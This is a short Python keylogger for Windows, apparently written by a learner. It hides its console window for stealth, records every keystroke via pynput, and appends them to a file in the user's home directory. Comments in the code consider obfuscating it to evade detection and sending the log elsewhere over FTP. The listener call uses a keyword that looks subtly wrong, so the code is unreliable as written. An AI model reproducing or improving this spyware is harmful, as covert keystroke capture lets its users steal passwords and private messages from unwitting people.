import os # handling windows os interactions, in this case a precursor to managing file paths.

from pynput import keyboard # finction to listen to keyboard presses
import win32console
import win32gui # control the windows console window. This allows 0 to be used as a variable and the
# the window to be hidden and the program to have a function of stealth

# what stops us from objuscating the defined parameters to avoid detection? 
# programming skills lacking in this regard
# also what stops us from transmitting the output file to another computer over ftp?



# need to figure out why this is necessary 
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

# initial log file to save and constantly append characters while the program is open. 
# from how I understand the function is that this is super useful for appending new characters
# also avoids hard coding the output when original constructed
# where this creates a file into the home directory
# need to figure out how to create elsewhere with appropriate permissions

log_file_path = os.path.join(os.path.expanduser("~"), "output.txt")

# IS called everytime a function is pressed.
# not so stealthy because it takes resources to listen to 
def press(key):
    try:
        key_str = str(key).replace("'", "")  # the translation that is being made to the output file

        if key == keyboard.Key.enter: # handling special cases 
            key_str = '\n'  
        elif key == keyboard.Key.space:
            key_str = ' '   
        elif key == keyboard.Key.tab:
            key_str = '\t'  
        elif key == keyboard.Key.backspace:
            key_str = '[BACKSPACE]' 
        elif key == keyboard.Key.esc:
            print("Shutting down")
            return False

        with open(log_file_path, 'a') as f:
            f.write(key_str)

    except Exception as e: # more error handling
        print(f"Error: {e}")


with keyboard.Listener(press=press) as listener: # start of the program
    listener.join()
